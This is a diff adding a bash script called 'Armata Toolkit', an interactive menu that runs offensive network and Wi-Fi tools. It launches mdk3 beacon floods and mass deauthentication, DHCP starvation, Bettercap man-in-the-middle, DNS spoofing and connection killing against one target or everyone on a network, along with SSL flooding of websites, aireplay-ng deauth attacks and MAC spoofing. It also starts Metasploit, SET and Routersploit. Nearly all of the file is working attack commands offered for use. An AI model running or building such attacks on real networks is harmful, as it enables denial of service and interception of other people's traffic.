@@ -1,0 +1,635 @@
+#!/bin/bash
+
+RCol='\e[0m'
+#colors
+#eg echo -e "${Blu}blue ${Red}red ${RCol}etc...."
+# Regular           Bold                Underline           High Intensity      BoldHigh Intens     Background          High Intensity Backgrounds
+Bla='\e[0;30m';     BBla='\e[1;30m';    UBla='\e[4;30m';    IBla='\e[0;90m';    BIBla='\e[1;90m';   On_Bla='\e[40m';    On_IBla='\e[0;100m';
+Red='\e[0;31m';     BRed='\e[1;31m';    URed='\e[4;31m';    IRed='\e[0;91m';    BIRed='\e[1;91m';   On_Red='\e[41m';    On_IRed='\e[0;101m';
+Gre='\e[0;32m';     BGre='\e[1;32m';    UGre='\e[4;32m';    IGre='\e[0;92m';    BIGre='\e[1;92m';   On_Gre='\e[42m';    On_IGre='\e[0;102m';
+Yel='\e[0;33m';     BYel='\e[1;33m';    UYel='\e[4;33m';    IYel='\e[0;93m';    BIYel='\e[1;93m';   On_Yel='\e[43m';    On_IYel='\e[0;103m';
+Blu='\e[0;34m';     BBlu='\e[1;34m';    UBlu='\e[4;34m';    IBlu='\e[0;94m';    BIBlu='\e[1;94m';   On_Blu='\e[44m';    On_IBlu='\e[0;104m';
+Pur='\e[0;35m';     BPur='\e[1;35m';    UPur='\e[4;35m';    IPur='\e[0;95m';    BIPur='\e[1;95m';   On_Pur='\e[45m';    On_IPur='\e[0;105m';
+Cya='\e[0;36m';     BCya='\e[1;36m';    UCya='\e[4;36m';    ICya='\e[0;96m';    BICya='\e[1;96m';   On_Cya='\e[46m';    On_ICya='\e[0;106m';
+Whi='\e[0;37m';     BWhi='\e[1;37m';    UWhi='\e[4;37m';    IWhi='\e[0;97m';    BIWhi='\e[1;97m';   On_Whi='\e[47m';    On_IWhi='\e[0;107m';
+
+#ifnames
+#change variable values if device interface names are different
+conIface=wlan0 #primary interface
+wIface=wlan1 #secondary interface
+mIface=wlan1mon #monitor mode interface (for mdk3 or airmon)
+
+show1(){
+	echo "Setting Interface to monitor..."
+	sudo sudo iwconfig $wIface mode monitor
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+
+show2(){
+	sudo ifconfig $wIface down
+	sudo macchanger -A $wIface
+	sleep 1
+	sudo ifconfig $wIface up
+	echo -ne '\n'
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+
+show3(){
+	sudo airodump-ng $wIface
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+
+
+show4(){
+ip r show|grep " src "|cut -d " " -f 3,12
+ip a
+echo -e "${Cya}Enter the subnet ID with correct mask bits${RCol}"
+echo -n -e "${BWhi}Armata> ${RCol}"
+read subnetid
+echo -e "${Cya}got it..."
+echo "running scan..."
+echo -e "${RCol}"
+sudo nmap -T4 -A $subnetid
+echo -e "${On_IRed}Done${RCol}"
+read a
+}
+
+
+show5(){
+ip r show|grep " src "|cut -d " " -f 3,12
+ip a
+echo "Enter the subnet ID with correct mask bits"
+echo -n -e "${BWhi}Armata> ${RCol}"
+read subnetid
+echo "got it..."
+echo "running scan..."
+echo ""
+sudo nmap -sL $subnetid
+echo -e "${On_IRed}Done${RCol}"
+read a
+}
+
+
+show6(){
+ip r show|grep " src "|cut -d " " -f 3,12
+ip a
+echo""
+echo -e "${Red}### WARNING! This scan will take a long time! ###${RCol}"
+echo ""
+echo "Enter the target IP"
+echo -n -e "${BWhi}Armata> ${RCol}"
+read targetip
+echo "got it..."
+echo "running scan..."
+echo ""
+sudo nmap -sS -sU -PN -p 1-65535 $targetip
+echo -e "${On_IRed}Done${RCol}"
+read a
+}
+
+
+show7(){
+	clear
+	while :
+	do
+		clear
+		echo -e "${BCya}"
+		cat banner2.txt
+		echo -e "${RCol}"
+		echo -n -e "${BYel} $wIface MAC Address: "
+		sudo ifconfig $wIface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'
+		echo -n " IP Adrress: "
+		hostname -I
+		echo -e " ${RCol}"
+		echo -e "${Red} "
+		echo "	[1] Beacon Flooding (mdk3)"
+		echo "	[2] Mass Deauthentication (mdk3)"
+		echo "	[3] Ddos network on $wIface filling DHCP (DHCPig)"
+		echo "	[4] MITM (Man In The Middle) attack on target (Bettercap)"
+		echo "	[5] DNS Spoof Block a website and redirect (Bettercap)"
+		echo "	[6] Start $mIface for mdk3 to work"
+        echo "	[7] Kill network connection (Bettercap)"
+		echo -e "${RCol}"
+		echo -e "${On_Red}	[x] Back ${RCol}"
+		echo ""
+		echo -n -e "${BWhi}Armata>${RCol}"
+		read option
+		case $option in
+			1)show13;;
+			2)show14;;
+			3)sudo python ~/DHCPig/pig.py -c $conIface;; #change path to dhcpig
+			4)show15;;
+			5)websiteattackopt;;
+			6)wlanmon;;
+            7)connectionkill;;
+			x)break;;
+			*) echo "Enter the options 1 to 7 or x to exit";;
+		esac
+	done
+}
+
+wlanmon(){
+sudo airmon-ng start $wIface
+echo "done"
+read a
+}
+
+show8(){
+echo -n "Starting Websploit Framework"
+sudo websploit
+echo -e "${On_IRed}Done${RCol}"
+read a
+}
+
+show9(){
+	echo -n "Starting Metasploit Framework"
+	msfconsole
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+show10(){
+	echo -n "Starting SEtoolkit"
+	sudo setoolkit
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+show11(){
+	echo -n "Starting Routersploit Framework"
+	python ~/routersploit/rsf.py #change path to routersploit
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+show12(){
+	echo -n "Starting Shark"
+	sudo tshark -i wlan0
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+show13(){
+	clear
+	while :
+	do
+		clear
+		echo -e "${BCya}"
+		cat banner3.txt
+		echo -e "${RCol}"
+		echo -e "${Red}"
+		echo ""
+		echo "Select ESSID name types"
+		echo ""
+		echo "	[1] Random ESSID names"
+		echo "	[2] Profanity ESSID names"
+		echo "	[3] 10 Million ESSID names"
+		echo "	[4] Specify ESSID"
+		echo -e "${RCol}"
+		echo -e "${On_Red}	[x] Back ${RCol}"
+		echo ""
+		echo -n -e "${BWhi}Armata> ${RCol}"
+		read option
+		case $option in # enter your wordlist path here
+			1)sudo mdk3 $mIface b -f ~home/xelvi/Wordlists/Passwords/mil-dic.txt -b 54 -w a -m -c 11;;
+			2)sudo mdk3 $mIface b -f ~/Wordlists/Passwords/badwords.txt -b 54 -w a -m -c 11;;
+			3)sudo mdk3 $mIface b -f ~/Wordlists/Passwords/10_million_password_list_top_100000.txt -b 54 -w a -m -c 11;;
+			4)specifyes;;
+			x)break;;
+			*) echo "Enter the options 1 to 4 or x to exit";;
+		esac
+	done
+}
+show14(){
+
+	echo -e "${Red} *** Whitelist in whitelist.txt  *** ${RCol}"
+	> whitelist.txt
+	echo "Continue.."
+	read a
+	echo -n "Current MAC address: "
+	sudo ifconfig $mIface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'
+	echo "Do you want to whitelist yourself from the attack? [Y/N]"
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	buffer2=$(sudo ifconfig $mIface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
+	read option
+		case $option in
+			y) echo $buffer2 >> whitelist.txt;;
+			Y) echo $buffer2 >> whitelist.txt;;
+			n) echo "got it..";;
+			N) echo "got it..";;
+			x) break;;
+			exit) break;;
+		esac
+		echo ""
+while :
+do
+	echo "Add any optional MAC or AP to whitelist? [Y/N]"
+	echo -n -e "${BWhi}Armata> ${RCol}"
+		read option
+		case $option in
+			y) addmac;;
+			Y) addmac;;
+			*) break;;
+		esac
+done
+	echo ""
+	echo -e "${Red}Press any to start attack${RCol}"
+	echo ""
+	read a
+	echo -n "running deauthentication attack now"
+	sudo mdk3 $mIface d -w whitelist.txt -c 1,6,11
+	echo echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+show15(){
+
+	echo -e "${Red} *** WARNING this attack may crash the router ***${RCol}"
+	echo "Continue.."
+	read a
+	ip r show|grep " src "|cut -d " " -f 3,12
+	ip a
+	echo "Enter Gateway"
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read gatenum
+	echo "Enter Target IP"
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read targetipp
+	echo "Got it..."
+	echo "running MITM attack now..."
+	sudo bettercap -X -I $conIface -G $gatenum -T $targetipp --proxy
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+show16(){
+
+	echo -n "Starting Shark"
+	echo "Capturing ARP Packets"
+	sudo tshark -i wlan0 arp
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+addmac(){
+	echo ""
+	echo "Enter MAC address: "
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read macin
+	echo $macin >> whitelist.txt
+	echo -e "${On_IRed}Done${RCol}"
+}
+specifyes(){
+	echo ""
+	echo "Enter ESSID name:"
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read essidn
+	echo "Got it..."
+	echo "running beacon flood now..."
+	sudo mdk3 $mIface b -n $essidn -b 54 -w a -m -c 11
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+resetin(){
+	sudo nmcli dev disconnect $wIface
+	sudo ifconfig $wIface down
+	echo -ne "###############           (50%) Changing mode to managed...\r"
+	sudo iwconfig $wIface mode managed
+	echo -ne -e "###########################(100%) ${Cya}Bringing Interface Up...${RCol}"
+	echo -ne '\n'
+	sudo ifconfig $wIface up
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+websiteattack(){
+	echo -e "${Yel}Enter a DNS to block ${RCol}"
+	echo ""
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read website
+	echo -e "${Yel}Enter target IP address ${RCol}"
+	echo ""
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read tnum
+	echo -e "${Yel}Enter Gatewy ${RCol}"
+	echo ""
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read gnum
+	echo -e "${Yel}Got it... ${RCol}"
+	sleep 0.4
+	echo -e "${Yel}Writing Configuration... ${RCol}"
+	> websiteblacklist.txt
+	buffer=$(ip addr show $conIface | grep -Po 'inet \K[\d.]+')
+	echo -n $buffer >> websiteblacklist.txt
+	echo -n "       " >> websiteblacklist.txt
+	echo "${website}" >> websiteblacklist.txt
+
+	echo -e "${Red} Running attack now...${RCol}"
+	sudo bettercap -X -I $conIface -G $gnum -T $tnum --dns websiteblacklist.txt
+
+
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+
+connectionkill(){
+	echo -e "${Yel}Enter target IP address ${RCol}"
+	echo ""
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read targetip
+	echo -e "${Yel}Got it... ${RCol}"
+	echo -e "${Red} Running attack now...${RCol}"
+	sudo bettercap -I $conIface -T $targetip --kill
+
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+
+
+websiteattack2(){
+	echo -e "${Red}WARNING this attack PROBABLY WILL CRASH THE WHOLE ROUTER.."
+	echo "just letting you know.. press any to continue"
+	read a
+	echo -e "${Yel}Enter a DNS to block ${RCol}"
+	echo ""
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read website
+	echo -e "${Yel}Enter Gatewy ${RCol}"
+	echo ""
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read gnum
+	echo -e "${Yel}Got it... ${RCol}"
+	sleep 0.4
+	echo -e "${Yel}Writing Configuration... ${RCol}"
+	> websiteblacklist.txt
+	buffer=$(ip addr show $wIface | grep -Po 'inet \K[\d.]+')
+	echo -n $buffer >> websiteblacklist.txt
+	echo -n "       " >> websiteblacklist.txt
+	echo "${website}" >> websiteblacklist.txt
+
+	echo -e "${Red} Running attack now...${RCol}"
+	sudo bettercap -X -I $conIface -G $gnum --dns websiteblacklist.txt
+
+
+	echo -e "${On_IRed}Done${RCol}"
+	read a
+}
+quicks(){
+	echo -e "${Yel}Scanning for Access Points...${RCol}"
+	nmcli -f in-use,ssid,bssid,signal,bars  dev wifi
+	echo -e "${On_IRed}Done ${RCol}"
+	read a
+}
+
+
+websiteattackopt(){
+		clear
+	while :
+	do
+		clear
+		echo -e "${IPur}"
+		cat banner.txt
+		echo -e "${RCol}"
+		echo ""
+		echo -n -e "${BYel} $wIface MAC Address: "
+		sudo ifconfig $wIface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'
+		echo -n " IP Adrress: "
+		hostname -I
+		echo -e " ${RCol}"
+		echo -e "${Blu}"
+		echo ""
+		echo "Additional Options"
+		echo ""
+		echo -e "	[1] Target ${Red}EVERYONE${Blu} on the network"
+		echo -e "	[2] Target ${Red}ONE${Blu} specific target"
+		echo -e "${RCol}"
+		echo -e "${On_Red}	[x] Back ${RCol}"
+		echo ""
+		echo -n -e "${BWhi}Armata> ${RCol}"
+		read option
+		case $option in
+			1)websiteattack2;;
+			2)websiteattack;;
+			x)break;;
+			*) echo "Enter option 1, 2 or x to exit";;
+		esac
+	done
+}
+sslddos(){
+echo -e " ${Gre} Enter DNS Name ${RCol} "
+echo -n -e "${BWhi}Armata> ${RCol}"
+read dns
+buffer4=$(getent hosts $dns | awk '{ print $1 }')
+echo -e " ${Gre} Enter Port Number (tip. port 80 or 8080 is usually HTCP) ${RCol} "
+echo -n -e "${BWhi}Armata> ${RCol}"
+read dnsport
+echo -n -e "${Gre}Got it... ${RCol}"
+echo ""
+echo -n -e "${Gre}Running attack now... ${RCol}"
+sudo thc-ssl-dos $buffer4 $dnsport --accept
+echo -e "${On_IRed}Done ${RCol}"
+read a
+}
+automate(){
+echo -e " ${Gre} Enter DNS Name ${RCol} "
+echo -n -e "${BWhi}Armata> ${RCol}"
+read dns
+echo -e " ${Gre} Resolving DNS to IP Please wait...${RCol}"
+buffer3=$(getent hosts $dns | awk '{ print $1 }')
+echo -e " ${Gre} Got it...${RCol}"
+echo -e " ${Gre} Running scanner Please wait...${RCol}"
+sudo python Automater.py $buffer3 >> automaterOut.txt
+echo -e "${Gre} Scan complete, Displaying output now...${RCol}"
+sleep 3
+less automaterOut.txt
+echo -e "${On_IRed}Done ${RCol}"
+read a
+}
+resolveURL(){
+echo -e " ${Gre} Enter DNS Name ${RCol} "
+echo -n -e "${BWhi}Armata> ${RCol}"
+read dns
+echo -e " ${Gre} Resolving DNS to IP Please wait...${RCol}"
+getent hosts $dns | awk '{ print $1 }'
+echo -e "${On_IRed}Done ${RCol}"
+read a
+}
+
+concon(){
+sudo nmcli -f in-use,ssid,bssid,signal,bars  dev wifi
+echo -e " ${Gre} Enter ESSID ${RCol} "
+echo -n -e "${BWhi}Armata> ${RCol}"
+read essidn
+echo -e " ${Gre} Enter Password ${RCol} "
+echo -n -e "${BWhi}Armata> ${RCol}"
+read passwordn
+nmcli dev wifi con "$essidn" password $passwordn
+sleep 2
+nmcli con show
+echo -e "${On_IRed}Done ${RCol}"
+read a
+}
+chswitch(){
+echo -e " ${Gre} Enter Channel Number ${RCol} "
+echo -n -e "${BWhi}Armata> ${RCol}"
+read channum
+sudo ifconfig wlan1 down
+sleep 0.5
+sudo iwconfig wlan1 channel $channum
+sleep 0.5
+sudo ifconfig wlan1 up
+echo -e "${On_IRed}Done ${RCol}"
+read a
+}
+wcracker(){
+	clear
+		while :
+	do
+		clear
+		echo -e "${IPur}"
+		cat banner.txt
+		echo -e "${RCol}"
+		echo -e "${Blu}"
+		echo ""
+		echo "Wireless Cracking Options"
+		echo ""
+		echo -e "	[1] Dump all network data [airodump-ng]"
+		echo -e "	[2] Sniff for data on AP [airodump-ng]"
+		echo -e "	[3] Launch WEP handshake attack [aireplay-ng]"
+		echo -e "${RCol}"
+		echo -e "${On_Red}	[x] Back ${RCol}"
+		echo ""
+		echo -n -e "${BWhi}Armata> ${RCol}"
+		read option
+		case $option in
+			2)dumpsniff;;
+			3)wephand;;
+			1)dumpall;;
+			x)break;;
+			*) echo "Enter option 1, 2 or x to exit";;
+		esac
+	done
+}
+dumpall(){
+	sudo airmon-ng start $wIface
+	sleep 0.5
+	sudo airodump-ng --showack $mIface
+	echo -e "${On_IRed}Done ${RCol}"
+	read a
+}
+dumpsniff(){
+	sudo airmon-ng start $wIface
+	sleep 0.5
+	sudo airodump-ng --showack $mIface
+	echo -e "${On_IRed}Scanner stopped ${RCol}"
+	read a
+	echo -e " ${Gre} ENTER channel number ${RCol} "
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read channum
+	echo -e " ${Gre} ENTER BSSID ${RCol} "
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read bssid
+	echo -e " ${Gre} ENTER name of capture file ${RCol} "
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read capname
+	echo -e "${Gre} Got everything, starting now... ${RCol} "
+	sleep 0.5
+	sudo ifconfig $mIface down
+	sleep 0.5
+	sudo iwconfig $mIface channel $channum
+	sleep 0.5
+	sudo ifconfig $mIface up
+	sleep 0.5
+	sudo airodump-ng -c $channum --bssid $bssid --showack -w $capname $mIface
+	echo -e "${On_IRed}Done ${RCol}"
+	read a
+}
+wephand(){
+	echo -e " ${Gre} ENTER BSSID ${RCol} "
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read bssid
+	echo -e " ${Gre} ENTER Client number ${RCol} "
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read clientno
+	echo -e "${Gre} Got everything, starting now... ${RCol} "
+	sudo aireplay-ng -0 0 -a $bssid -c $clientno $mIface
+	echo -e "${On_IRed}Done ${RCol}"
+	read a
+}
+
+while :
+do
+	clear
+	echo -e "${BCya} "
+	cat banner.txt
+	echo ""
+	echo -e "${Cya} Armata Toolkit ${RCol}"
+	echo ""
+	echo -n -e "${BYel} $wIface MAC Address: "
+	sudo ifconfig $wIface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'
+	echo -n " IP Adrress: "
+	hostname -I
+	echo -e " ${RCol}"
+	echo -e "	${Yel}Scan & spoof${RCol}"
+	echo -e "	${Gre}[1] Set Wireless Interface to Monitor Mode${RCol}"
+	echo -e "	${Gre}[01] Reset Wireless Interface ${RCol}"
+	echo -e "	${Gre}[2] Spoof MAC Address ${RCol}"
+	echo -e "	${Gre}[3] Scan/Sniff Wireless Access Points ${RCol}"
+	echo ""
+	echo -e "	${Gre}[s] Scan All Protocol Type Packets ${Rcol}"
+	echo -e "	${Gre}[a] Scan Address Resolution Protocol Packets ${Rcol}"
+	echo -e "	${Gre}[q] Quick Wifi Scan ${Rcol}"
+	echo ""
+	echo -e "	${Yel}Nmap scans${RCol}"
+	echo -e "	${Red}[4] Aggressive network mapping${RCol}"
+	echo -e "	${Red}[5] Passive network mapping${RCol}"
+	echo -e "	${Red}[6] Long intense target mapping${RCol}"
+	echo ""
+	echo -e "	${Yel}Wireless ${RCol}"
+	echo -e "	${BPur}[7] List wireless attacks${RCol}"
+	echo -e "	${BPur}[c] Connect to AP ${RCol}"
+	echo -e "	${BPur}[ch] Switch $wIface operating channel ${RCol}"
+	echo ""
+	echo -e "	${Yel}Exploitation Frameworks${RCol}"
+	echo -e "	${Blu}[8] Run Websploit Framework${RCol}"
+	echo -e "	${Blu}[9] Run Metasploit Framework${RCol}"
+	echo -e "	${Blu}[10] Run Social Engineering toolkit${RCol}"
+	echo -e "	${Blu}[11] Run Routersploit Framework${RCol}"
+	echo ""
+	echo -e "	${Yel}Website Attacks and Scan${RCol}"
+	echo -e "	${Pur}[12] Ddos Website Using SSL Request Flooding (THC-SSL-DoS)${RCol}"
+	echo -e "	${Pur}[13] Scan a Website (Automater) *RUN IN AUTOMATER DIRECTORY*${Rcol}"
+	echo -e "	${Pur}[14] Resolve DNS to IP Address ${Rcol}"
+	echo ""
+	echo -e "	${Yel}WiFi Attacks and Crack ${RCol}"
+	echo -e "	${Whi}[15] Wireless Cracker ${Rcol}"
+	echo ""
+	echo -e "${On_Red}	[x] Exit ${RCol}"
+	echo ""
+	echo -n -e "${BWhi}Armata> ${RCol}"
+	read option
+	case $option in
+		1) show1;;
+		2) show2;;
+		3) show3;;
+		4) show4;;
+		5) show5;;
+		6) show6;;
+		7) show7;;
+		8) show8;;
+		9) show9;;
+		10) show10;;
+		11) show11;;
+		12) sslddos;;
+		13) automate;;
+		14) resolveURL;;
+		s) show12;;
+		a) show16;;
+		01) resetin;;
+		q) quicks;;
+		c) concon;;
+		ch) chswitch;;
+		15) wcracker;;
+		x) break ;;
+		*) echo "Wrong option. Enter the options displayed or x to exit";
+		echo "Press any key to continue" ; read a ;;
+	esac
+done
+clear
+exit 0
+
